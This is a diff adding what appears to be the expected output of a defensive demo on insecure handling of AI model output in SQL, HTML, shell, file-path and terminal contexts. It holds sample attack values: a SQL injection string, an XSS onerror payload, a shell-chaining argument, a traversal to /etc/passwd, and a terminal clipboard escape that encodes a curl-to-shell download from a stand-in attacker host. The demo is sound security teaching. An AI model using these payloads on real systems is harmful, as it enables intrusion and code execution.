@@ -1,0 +1,26 @@
+
+== 1. Text-to-SQL: the model writes the query ==========================
+as shipped (executescript): tables left: []
+read-only connection:        attempt to write a readonly database
+                             tables left: ['orders']
+intent + parameters:         [('ORD-1042', 'shipped')]
+intent + injected id:        bad order_id: "ORD-1042' OR 1=1 --"
+
+== 2. A chat answer rendered in the browser ============================
+as shipped: <div class='answer'>Here is your summary. <img src=x onerror="fe...
+encoded:    <div class='answer'>Here is your summary. &lt;img src=x onerror=&quot;...
+
+== 3. The model names the file to archive ==============================
+shell=True:   ['archiving q3-report.txt', 'INJECTED COMMAND RAN']
+argument list: ['archiving q3-report.txt; echo INJECTED COMMAND RAN']
+
+== 4. The model picks which report to open =============================
+  q3-summary.txt     -> reports/q3-summary.txt
+  ../../etc/passwd   -> refused: outside reports/: ../../etc/passwd
+
+== 5. Model output written to a terminal or log viewer =================
+what a human sees in the terminal:
+  Deploy finished: all checks passed
+what the bytes actually are, neutralised:
+  Deploy finished: 0 errors\x1b[2K\x0d
+  Deploy finished: all checks passed\x1b]52;c;Y3VybCBhdHRhY2tlci50ZXN0fHNo\x07
